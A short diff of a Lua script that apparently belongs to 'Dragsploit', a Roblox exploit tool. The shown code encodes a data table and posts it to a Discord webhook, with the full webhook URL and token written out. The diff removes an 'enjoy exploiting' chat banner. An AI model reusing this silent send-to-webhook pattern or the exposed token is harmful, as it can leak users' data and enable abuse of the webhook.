@@ -6,12 +6,3 @@ local Data = {
 Data = http:JSONEncode(Data)
 
 http:PostAsync("https://discordapp.com/api/webhooks/702814574004666419/MDsc1Q9pkNoU1zOBBjXOclItitXK8XThIa7wxlJkHFZVC2YHYJh-47kPRlCxxaIrxJwS", Data) 
-
-
-bc = BrickColor.new ("Toothpaste")
-game.StarterGui:SetCore("ChatMakeSystemMessage",{
- Text = "[Dragsploit]: Dragsploit is up to date, enjoy exploiting!";
- Font = Enum.Font.SourceSans;
- Color = bc.Color;
- FontSize = Enum.FontSize.Size96;
-})
